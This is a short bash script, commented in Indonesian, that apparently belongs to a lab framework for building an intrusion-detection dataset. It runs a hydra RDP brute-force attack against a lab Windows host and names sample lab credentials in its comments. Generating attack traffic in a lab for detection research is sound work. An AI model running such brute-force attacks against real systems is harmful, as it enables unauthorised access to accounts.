#!/usr/bin/env bash
# S05 — RDP brute force (hydra rdp). Kategori: Brute Force (Windows).
# Target: win-client :3389. Fase: WINDOWS (win-client nyala, client-1/2 mati).
SCN=S05; ATTACK_CAT="Brute Force"; PHASE=windows
HERE="$(cd "$(dirname "$0")" && pwd)"; . "$HERE/../_lib/common.sh"
need_tool hydra
banner
ensure_up "$WIN"

mark_start "$WIN"
# -t 2 (RDP mudah drop kalau terlalu paralel). admin_lab/Admin@2024 & labuser/P@ssw0rd123 ada di list.
hydra -L "$USERLIST" -P "$PASSLIST" -t 2 -f -o "$HERE/s05-rdp.hydra" rdp://"$WIN" || true
mark_end "$WIN"
echo "Output: s05-rdp.hydra"
# CATATAN: modul rdp hydra kadang rewel; kalau 0 hasil tapi trafik tetap terekam,
# itu sudah cukup untuk dataset (pola koneksi 3389 berulang = fitur brute force).
